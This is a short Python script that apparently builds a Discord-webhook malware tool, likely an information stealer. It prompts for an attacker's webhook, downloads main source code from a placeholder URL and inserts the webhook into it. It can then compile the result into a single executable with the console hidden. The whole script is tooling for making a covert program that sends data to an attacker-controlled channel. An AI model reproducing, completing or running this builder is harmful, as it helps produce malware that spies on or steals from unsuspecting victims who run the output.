import os
import sys
import subprocess
import requests

MAIN_SOURCE_URL = "x"

def build():
    webhook = input("Enter Discord Webhook: ").strip()
    if not webhook:
        print("Webhook is required!")
        sys.exit()

    try:
        print("\n[*] Fetching source code...")
        main_resp = requests.get(MAIN_SOURCE_URL)
        if main_resp.status_code != 200:
            print("Failed to fetch main source!")
            sys.exit()
        final_code = main_resp.text
    except Exception as e:
        print(f"Error: {e}")
        sys.exit()

    final_code = final_code.replace("WEBHOOK_HERE", webhook)

    output_name = "built_main.py"
    with open(output_name, "w", encoding="utf-8") as f:
        f.write(final_code)
    print(f"\n[SUCCESS] Build complete: {output_name}")

    if input("\nConvert to EXE? (y/n): ").lower() == 'y':
        try:
            print("[*] Installing requirements...")
            subprocess.check_call([sys.executable, "-m", "pip", "install", "pyinstaller", "requests"])
            print("[*] Building EXE...")
            subprocess.check_call(["pyinstaller", "--onefile", "--noconsole", output_name])
            print("[DONE] Check the 'dist' folder.")
        except Exception as e:
            print(f"EXE Error: {e}")

if __name__ == "__main__":
    build()
